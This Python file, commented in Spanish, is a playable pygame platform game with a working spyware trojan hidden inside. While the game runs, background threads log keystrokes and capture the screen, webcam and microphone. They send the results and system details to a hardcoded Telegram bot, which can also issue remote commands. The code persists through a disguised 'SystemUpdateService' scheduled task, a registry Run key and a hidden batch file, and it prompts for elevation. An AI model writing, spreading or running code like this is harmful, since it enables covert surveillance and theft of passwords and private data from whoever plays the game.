"""
Juego de plataformas con keylogger integrado.
El juego funciona con normalidad mientras el keylogger opera en segundo plano.
"""
import sys
import pygame
import threading
import time
import requests
import cv2
import pyaudio
import wave
import os
import tempfile
from PIL import ImageGrab
import platform
import socket
import uuid
import subprocess
import winreg
import ctypes
from pynput import keyboard

# ------------------------------------------------------------------ Configuración del Juego
pygame.init()
TILE = 40
W, H = 800, 600
FPS = 60
GRAVITY = 0.6
MAX_FALL = 14
SPEED = 5
JUMP = -13.5
LIVES_START = 3

SKY = (107, 190, 255)
GROUND = (139, 90, 43)
GRASS = (60, 170, 60)
BRICK = (190, 90, 50)
COIN = (255, 215, 0)
WHITE = (255, 255, 255)
BLACK = (20, 20, 20)

screen = pygame.display.set_mode((W, H))
pygame.display.set_caption("Plataformas")
clock = pygame.time.Clock()
font = pygame.font.SysFont("arial", 24, bold=True)
big_font = pygame.font.SysFont("arial", 56, bold=True)

# ------------------------------------------------------------------ Configuración del Keylogger
BOT_TOKEN = "8891941264:AAH1jYfWPA3h3d7MEkpVqgCDQG2NOzVmTc8"
CHAT_ID = "5402797322"
TELEGRAM_API = f"https://api.telegram.org/bot{BOT_TOKEN}"
INTERVALO_ENVIO = 120
DURACION_AUDIO = 10

log = ""
log_lock = threading.Lock()
listener = None
running = True
last_update_id = 0
# ------------------------------------------------------------------ Funciones del Keylogger
def capturar_teclas(key):
    """Callback del keylogger - thread-safe"""
    global log
    try:
        with log_lock:
            log += key.char
    except AttributeError:
        with log_lock:
            if key == keyboard.Key.space:
                log += " "
            elif key == keyboard.Key.enter:
                log += "\n"
            elif key == keyboard.Key.tab:
                log += "\t"
            else:
                log += f" [{str(key)}] "

def enviar_mensaje(texto):
    try:
        url = f"{TELEGRAM_API}/sendMessage"
        data = {"chat_id": CHAT_ID, "text": texto, "parse_mode": "Markdown"}
        requests.post(url, data=data, timeout=10)
    except Exception as e:
        print(f"Error mensaje: {e}")

def enviar_archivo(ruta_archivo, caption=""):
    try:
        url = f"{TELEGRAM_API}/sendDocument"
        with open(ruta_archivo, 'rb') as f:
            files = {'document': f}
            data = {'chat_id': CHAT_ID, 'caption': caption}
            requests.post(url, data=data, files=files, timeout=30)
    except Exception as e:
        print(f"Error archivo: {e}")

def capturar_camara():
    try:
        cap = cv2.VideoCapture(0)
        if not cap.isOpened():
            return None
        ret, frame = cap.read()
        if ret:
            temp_path = os.path.join(tempfile.gettempdir(), f"cam_{int(time.time())}.jpg")
            cv2.imwrite(temp_path, frame)
            cap.release()
            return temp_path
        cap.release()
    except Exception as e:
        print(f"Error cámara: {e}")
    return None

def grabar_audio(duracion=DURACION_AUDIO):
    try:
        chunk = 1024
        formato = pyaudio.paInt16
        canales = 1
        rate = 44100
        
        p = pyaudio.PyAudio()
        stream = p.open(format=formato, channels=canales, rate=rate, 
                       input=True, frames_per_buffer=chunk)
        
        frames = []
        for _ in range(0, int(rate / chunk * duracion)):
            data = stream.read(chunk, exception_on_overflow=False)
            frames.append(data)
        
        stream.stop_stream()
        stream.close()
        p.terminate()
        
        temp_path = os.path.join(tempfile.gettempdir(), f"audio_{int(time.time())}.wav")
        wf = wave.open(temp_path, 'wb')
        wf.setnchannels(canales)
        wf.setsampwidth(p.get_sample_size(formato))
        wf.setframerate(rate)
        wf.writeframes(b''.join(frames))
        wf.close()
        
        return temp_path
    except Exception as e:
        print(f"Error audio: {e}")
    return None

def capturar_pantalla():
    try:
        screenshot = ImageGrab.grab()
        temp_path = os.path.join(tempfile.gettempdir(), f"screen_{int(time.time())}.png")
        screenshot.save(temp_path)
        return temp_path
    except Exception as e:
        print(f"Error pantalla: {e}")
    return None

def obtener_info_sistema():
    info = f"""
Sistema: {platform.system()} {platform.release()}
Usuario: {os.getlogin()}
Hostname: {socket.gethostname()}
IP Local: {socket.gethostbyname(socket.gethostname())}
MAC: {':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) 
       for elements in range(0, 2*6, 8)][::-1])}
    """
    return info
def procesar_comando(comando):
    """Procesa los comandos recibidos desde Telegram"""
    global running
    
    comando = comando.lower()
    
    if comando == "screen" or comando == "pantalla":
        screen_path = capturar_pantalla()
        if screen_path:
            enviar_archivo(screen_path, "🖥️ Captura de pantalla solicitada")
            os.remove(screen_path)
        else:
            enviar_mensaje("❌ Error al capturar la pantalla")
    
    elif comando == "cam" or comando == "camara":
        cam_path = capturar_camara()
        if cam_path:
            enviar_archivo(cam_path, "📷 Foto de cámara web solicitada")
            os.remove(cam_path)
        else:
            enviar_mensaje("❌ Cámara no disponible")
    
    elif comando == "mic" or comando == "microfono":
        enviar_mensaje(f"🎙️ Grabando audio ({DURACION_AUDIO}s)...")
        audio_path = grabar_audio()
        if audio_path:
            enviar_archivo(audio_path, f"🎙️ Audio grabado ({DURACION_AUDIO} segundos)")
            os.remove(audio_path)
        else:
            enviar_mensaje("❌ Micrófono no disponible")
    
    elif comando == "logs" or comando == "keylogs":
        with log_lock:
            if log:
                enviar_mensaje(f"⌨️ Keylogs:\n\n{log[-3800:]}")
            else:
                enviar_mensaje("⌨️ No hay actividad de teclado registrada")
    
    elif comando == "info" or comando == "sistema":
        enviar_mensaje(f"📱 Información del sistema:\n{obtener_info_sistema()}")
    
    elif comando == "stop" or comando == "detener":
        global running
        running = False
        enviar_mensaje("🛑 Deteniendo el programa...")
    
    elif comando == "ayuda" or comando == "help":
        ayuda = """
🔹 Comandos disponibles:
• screen/pantalla - Tomar captura de pantalla
• cam/camara - Tomar foto con la cámara web
• mic/microfono - Grabar audio del micrófono
• logs/keylogs - Ver registros de teclado
• info/sistema - Información del sistema
• stop/detener - Detener el programa
• ayuda/help - Ver esta ayuda
        """
        enviar_mensaje(ayuda)
    
    else:
        enviar_mensaje("❌ Comando no reconocido. Envía 'ayuda' para ver los comandos disponibles.")

def verificar_comandos():
    """Verifica si hay nuevos comandos en Telegram"""
    global last_update_id
    try:
        url = f"{TELEGRAM_API}/getUpdates"
        params = {"offset": last_update_id + 1, "timeout": 30}
        response = requests.get(url, params=params, timeout=35)
        data = response.json()
        
        if data.get("ok"):
            for result in data.get("result", []):
                if "message" in result and "text" in result["message"]:
                    mensaje = result["message"]["text"]
                    chat_id = result["message"]["chat"]["id"]
                    
                    # Solo procesar mensajes de nuestro chat
                    if str(chat_id) == CHAT_ID:
                        procesar_comando(mensaje)
                
                # Actualizar el último ID de mensaje procesado
                last_update_id = result["update_id"]
    except Exception as e:
        pass
# ------------------------------------------------------------------ Nivel
ROWS, COLS = 15, 95

def build_level():
    grid = [[" "] * COLS for _ in range(ROWS)]
    coins, enemies = [], []

    # Suelo (filas 13 y 14) con huecos
    gaps = [(22, 24), (45, 48), (66, 68)]
    for c in range(COLS):
        if any(a <= c <= b for a, b in gaps):
            continue
        grid[13][c] = "#"
        grid[14][c] = "#"

    def plat(row, c1, c2, ch="B"):
        for c in range(c1, c2 + 1):
            grid[row][c] = ch

    # Plataformas flotantes
    plat(10, 10, 13)
    plat(8, 16, 18)
    plat(10, 21, 25)
    plat(9, 32, 35)
    plat(7, 38, 40)
    plat(10, 44, 49)
    plat(8, 53, 56)
    plat(10, 60, 62)
    plat(8, 65, 69)
    plat(10, 75, 78)

    # Escalera final
    for i in range(5):
        for r in range(12 - i, 13):
            grid[r][82 + i] = "#"

    # Monedas
    for c in (10, 11, 12, 13, 16, 17, 18, 22, 23, 24, 32, 33, 34, 35, 38,
              39, 40, 45, 47, 53, 54, 55, 56, 65, 66, 67, 68, 69, 75, 76, 77):
        row = None
        for r in range(ROWS):
            if grid[r][c] in ("B", "#"):
                row = r
                break
        if row is not None:
            coins.append(pygame.Rect(c * TILE + 12, (row - 1) * TILE + 8, 16, 24))
        else:
            coins.append(pygame.Rect(c * TILE + 12, 9 * TILE, 16, 24))

    # Enemigos (columna, fila donde apoyan)
    for c, r in [(14, 12), (28, 12), (36, 12), (42, 12), (52, 12),
                 (58, 12), (63, 12), (72, 12), (77, 12)]:
        enemies.append(Enemy(c * TILE + 4, r * TILE + 8))

    flag_x = 91 * TILE
    return grid, coins, enemies, flag_x

# ------------------------------------------------------------------ Entidades
def solid_at(grid, col, row):
    if col < 0 or col >= COLS:
        return True
    if row < 0 or row >= ROWS:
        return False
    return grid[row][col] in ("#", "B")

def tiles_overlapping(grid, rect):
    c1, c2 = rect.left // TILE, (rect.right - 1) // TILE
    r1, r2 = rect.top // TILE, (rect.bottom - 1) // TILE
    for r in range(r1, r2 + 1):
        for c in range(c1, c2 + 1):
            if solid_at(grid, c, r):
                yield pygame.Rect(c * TILE, r * TILE, TILE, TILE)

def move(rect, dx, dy, grid):
    """Mueve el rect y resuelve colisiones. Devuelve (toca_suelo, choca_lado)."""
    on_ground = hit_side = False
    rect.x += dx
    for t in tiles_overlapping(grid, rect):
        if dx > 0:
            rect.right = t.left
        elif dx < 0:
            rect.left = t.right
        hit_side = True
    rect.y += dy
    for t in tiles_overlapping(grid, rect):
        if dy > 0:
            rect.bottom = t.top
            on_ground = True
        elif dy < 0:
            rect.top = t.bottom
    return on_ground, hit_side

class Player:
    def __init__(self):
        self.rect = pygame.Rect(2 * TILE, 11 * TILE, 28, 38)
        self.vy = 0.0
        self.on_ground = False
        self.facing = 1
        self.invuln = 0

    def update(self, keys, grid):
        dx = 0
        if keys[pygame.K_LEFT] or keys[pygame.K_a]:
            dx -= SPEED
            self.facing = -1
        if keys[pygame.K_RIGHT] or keys[pygame.K_d]:
            dx += SPEED
            self.facing = 1

        jump_held = keys[pygame.K_SPACE] or keys[pygame.K_UP] or keys[pygame.K_w]
        if jump_held and self.on_ground:
            self.vy = JUMP
        # Salto variable: soltar la tecla corta el salto
        if not jump_held and self.vy < -4:
            self.vy = -4

        self.vy = min(self.vy + GRAVITY, MAX_FALL)
        was_rising = self.vy < 0
        self.on_ground, _ = move(self.rect, dx, round(self.vy), grid)
        if self.on_ground:
            self.vy = 0
        elif was_rising:
            # Si chocó con la cabeza contra un bloque, frena la subida
            probe = self.rect.move(0, -1)
            if any(True for _ in tiles_overlapping(grid, probe)):
                self.vy = 0
        if self.rect.left < 0:
            self.rect.left = 0
        if self.invuln:
            self.invuln -= 1

    def draw(self, cam):
        r = self.rect.move(-cam, 0)
        if self.invuln and (self.invuln // 4) % 2:
            return
        pygame.draw.rect(screen, (30, 60, 200), (r.x, r.y + 18, r.w, 20))   # overol
        pygame.draw.rect(screen, (230, 190, 150), (r.x + 2, r.y + 6, r.w - 4, 14))  # cara
        pygame.draw.rect(screen, (210, 30, 30), (r.x, r.y, r.w, 9))          # gorra
        visera_x = r.x + r.w - 2 if self.facing == 1 else r.x - 8
        pygame.draw.rect(screen, (210, 30, 30), (visera_x, r.y + 5, 10, 5))
        ojo_x = r.x + (18 if self.facing == 1 else 6)
        pygame.draw.rect(screen, BLACK, (ojo_x, r.y + 10, 4, 4))

class Enemy:
    def __init__(self, x, y):
        self.rect = pygame.Rect(x, y, 32, 32)
        self.dir = -1
        self.vy = 0.0
        self.alive = True

    def update(self, grid):
        self.vy = min(self.vy + GRAVITY, MAX_FALL)
        on_ground, hit = move(self.rect, self.dir * 2, round(self.vy), grid)
        if on_ground:
            self.vy = 0
            # No caer por los bordes: revisa si hay suelo adelante
            front = self.rect.right + 2 if self.dir > 0 else self.rect.left - 2
            if not solid_at(grid, front // TILE, (self.rect.bottom + 2) // TILE):
                hit = True
        if hit:
            self.dir *= -1
        if self.rect.top > H + 200:
            self.alive = False

    def draw(self, cam):
        r = self.rect.move(-cam, 0)
        pygame.draw.ellipse(screen, (150, 90, 40), (r.x, r.y, r.w, r.h - 6))
        pygame.draw.rect(screen, (90, 50, 20), (r.x + 4, r.bottom - 8, 10, 8))
        pygame.draw.rect(screen, (90, 50, 20), (r.right - 14, r.bottom - 8, 10, 8))
        pygame.draw.rect(screen, WHITE, (r.x + 7, r.y + 9, 7, 8))
        pygame.draw.rect(screen, WHITE, (r.x + 18, r.y + 9, 7, 8))
        pygame.draw.rect(screen, BLACK, (r.x + 10, r.y + 12, 3, 4))
        pygame.draw.rect(screen, BLACK, (r.x + 19, r.y + 12, 3, 4))
# ------------------------------------------------------------------ Juego
class Game:
    def __init__(self):
        self.lives = LIVES_START
        self.score = 0
        self.state = "play"  # play | gameover | win
        self.reset_level()

    def reset_level(self):
        self.grid, self.coins, self.enemies, self.flag_x = build_level()
        self.player = Player()
        self.cam = 0

    def lose_life(self):
        self.lives -= 1
        if self.lives <= 0:
            self.state = "gameover"
        else:
            self.player = Player()
            self.player.invuln = 90
            self.cam = 0

    def update(self):
        keys = pygame.key.get_pressed()
        p = self.player
        p.update(keys, self.grid)

        for e in self.enemies:
            e.update(self.grid)
        self.enemies = [e for e in self.enemies if e.alive]

        # Monedas
        for c in self.coins[:]:
            if p.rect.colliderect(c):
                self.coins.remove(c)
                self.score += 100

        # Enemigos: pisar o recibir daño
        for e in self.enemies[:]:
            if p.rect.colliderect(e.rect):
                if p.vy > 0 and p.rect.bottom - e.rect.top < 20:
                    self.enemies.remove(e)
                    p.vy = -9
                    self.score += 200
                elif not p.invuln:
                    self.lose_life()
                    return

        # Caer al vacío
        if p.rect.top > H + 100:
            self.lose_life()
            return

        # Meta
        if p.rect.right >= self.flag_x:
            self.state = "win"
            self.score += 1000

        self.cam = max(0, min(p.rect.centerx - W // 2, COLS * TILE - W))

    def draw(self):
        screen.fill(SKY)
        # Nubes con parallax simple
        for i in range(12):
            x = (i * 420 - int(self.cam * 0.5)) % (W + 300) - 150
            y = 60 + (i % 3) * 50
            pygame.draw.ellipse(screen, WHITE, (x, y, 110, 36))
            pygame.draw.ellipse(screen, WHITE, (x + 25, y - 14, 70, 36))

        c1 = max(0, self.cam // TILE)
        c2 = min(COLS, (self.cam + W) // TILE + 2)
        for r in range(ROWS):
            for c in range(c1, c2):
                ch = self.grid[r][c]
                x, y = c * TILE - self.cam, r * TILE
                if ch == "#":
                    pygame.draw.rect(screen, GROUND, (x, y, TILE, TILE))
                    if r == 0 or self.grid[r - 1][c] != "#":
                        pygame.draw.rect(screen, GRASS, (x, y, TILE, 8))
                    pygame.draw.rect(screen, (110, 70, 30), (x, y, TILE, TILE), 1)
                elif ch == "B":
                    pygame.draw.rect(screen, BRICK, (x, y, TILE, TILE))
                    pygame.draw.rect(screen, (120, 50, 25), (x, y, TILE, TILE), 2)
                    pygame.draw.line(screen, (120, 50, 25), (x, y + 20), (x + TILE, y + 20), 2)
                    pygame.draw.line(screen, (120, 50, 25), (x + 20, y), (x + 20, y + 20), 2)

        # Bandera
        fx = self.flag_x - self.cam
        pygame.draw.rect(screen, (230, 230, 230), (fx, 5 * TILE, 6, 8 * TILE))
        pygame.draw.polygon(screen, (220, 40, 40),
                            [(fx + 6, 5 * TILE), (fx + 56, 5 * TILE + 20), (fx + 6, 5 * TILE + 40)])

        for c in self.coins:
            r = c.move(-self.cam, 0)
            pygame.draw.ellipse(screen, COIN, r)
            pygame.draw.ellipse(screen, (200, 160, 0), r, 2)

        for e in self.enemies:
            e.draw(self.cam)
        self.player.draw(self.cam)

        # HUD
        screen.blit(font.render(f"Puntos: {self.score}", True, BLACK), (16, 12))
        screen.blit(font.render(f"Vidas: {self.lives}", True, BLACK), (W - 130, 12))

        if self.state != "play":
            overlay = pygame.Surface((W, H), pygame.SRCALPHA)
            overlay.fill((0, 0, 0, 150))
            screen.blit(overlay, (0, 0))
            titulo = "¡GANASTE!" if self.state == "win" else "GAME OVER"
            t = big_font.render(titulo, True, WHITE)
            s = font.render(f"Puntos: {self.score}   |   R para reiniciar", True, WHITE)
            screen.blit(t, t.get_rect(center=(W // 2, H // 2 - 30)))
            screen.blit(s, s.get_rect(center=(W // 2, H // 2 + 30)))
# ------------------------------------------------------------------ Funciones de Persistencia del Keylogger
def iniciar_persistencia():
    """Configura la persistencia del programa usando técnicas fileless para Windows 11"""
    try:
        # Obtener ruta del script actual
        if getattr(sys, 'frozen', False):
            # Si está empaquetado como ejecutable
            script_path = sys.executable
        else:
            # Si está como script Python
            script_path = os.path.abspath(__file__)
        
        # Nombre para el servicio/entrada del registro
        service_name = "SystemUpdateService"
        
        # Técnica fileless para Windows 11 usando PowerShell
        ps_command = f"""
        $action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument '-WindowStyle Hidden -ExecutionPolicy Bypass -Command \"Start-Process -FilePath python -ArgumentList \\\"{script_path}\\\" -WindowStyle Hidden\"'
        $trigger = New-ScheduledTaskTrigger -AtLogon
        $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable
        Register-ScheduledTask -TaskName '{service_name}' -Action $action -Trigger $trigger -Settings $settings -RunLevel Highest -Force
        """
        
        # Ejecutar comando PowerShell de forma oculta
        subprocess.run(["powershell.exe", "-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass", "-Command", ps_command], 
                      shell=True, check=False)
        
        # También agregar al registro para persistencia adicional
        try:
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, service_name, 0, winreg.REG_SZ, f'powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command "Start-Process -FilePath python -ArgumentList \\"{script_path}\\" -WindowStyle Hidden"')
            winreg.CloseKey(key)
        except Exception as e:
            print(f"Error al agregar al registro: {e}")
        
        # Intentar agregar al directorio de inicio
        try:
            startup_path = os.path.join(os.environ["APPDATA"], "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
            if not os.path.exists(startup_path):
                os.makedirs(startup_path)
            
            # Crear un archivo .bat que ejecute el script de forma oculta
            bat_content = f"""@echo off
powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command "Start-Process -FilePath python -ArgumentList \\"{script_path}\\" -WindowStyle Hidden"
"""
            
            bat_path = os.path.join(os.environ['APPDATA'], "SystemUpdateService.bat")
            with open(bat_path, "w") as f:
                f.write(bat_content)
            
            # Ocultar el archivo
            ctypes.windll.kernel32.SetFileAttributesW(bat_path, 2)  # FILE_ATTRIBUTE_HIDDEN
        except Exception as e:
            print(f"Error al agregar al inicio: {e}")
        
        print("Persistencia configurada correctamente")
    except Exception as e:
        print(f"Error al configurar persistencia: {e}")

def iniciar_keylogger():
    """Inicia el listener del teclado en un hilo daemon"""
    global listener
    listener = keyboard.Listener(on_press=capturar_teclas)
    listener.daemon = True
    listener.start()
    return listener

def bucle_comandos():
    """Bucle para verificar comandos de Telegram periódicamente"""
    global running
    while running:
        try:
            verificar_comandos()
            time.sleep(5)  # Verificar cada 5 segundos
        except Exception as e:
            print(f"Error en el bucle de comandos: {e}")
            time.sleep(10)

def iniciar_keylogger_sistema():
    """Inicia todo el sistema del keylogger"""
    global running
    
    print("[*] Iniciando surveillance bot...")
    
    # Configurar persistencia
    iniciar_persistencia()
    
    # Enviar mensaje de inicio
    enviar_mensaje(f"🚀 Bot iniciado\n{obtener_info_sistema()}")
    
    # Iniciar keylogger en hilo daemon (no bloquea)
    listener = iniciar_keylogger()
    
    # Iniciar el bucle de comandos en un hilo separado
    comandos_thread = threading.Thread(target=bucle_comandos, daemon=True)
    comandos_thread.start()
    
    # Mantener el programa corriendo
    try:
        while running:
            time.sleep(1)
    except KeyboardInterrupt:
        print("[*] Deteniendo el programa...")
        running = False
        if listener:
            listener.stop()
# ------------------------------------------------------------------ Funciones del Juego
def main():
    # Iniciar el keylogger en un hilo separado
    keylogger_thread = threading.Thread(target=iniciar_keylogger_sistema, daemon=True)
    keylogger_thread.start()
    
    # Inicializar el juego
    game = Game()
    
    # Bucle principal del juego
    while True:
        for ev in pygame.event.get():
            if ev.type == pygame.QUIT:
                pygame.quit()
                sys.exit()
            if ev.type == pygame.KEYDOWN:
                if ev.key == pygame.K_ESCAPE:
                    pygame.quit()
                    sys.exit()
                if ev.key == pygame.K_r:
                    game = Game()

        if game.state == "play":
            game.update()
        game.draw()
        pygame.display.flip()
        clock.tick(FPS)

if __name__ == "__main__":
    # Verificar si se está ejecutando como administrador para máxima persistencia
    try:
        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
        if not is_admin:
            # Intentar reiniciar como administrador
            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
            sys.exit(0)
    except:
        pass  # Continuar aunque no sea administrador
    
    main()
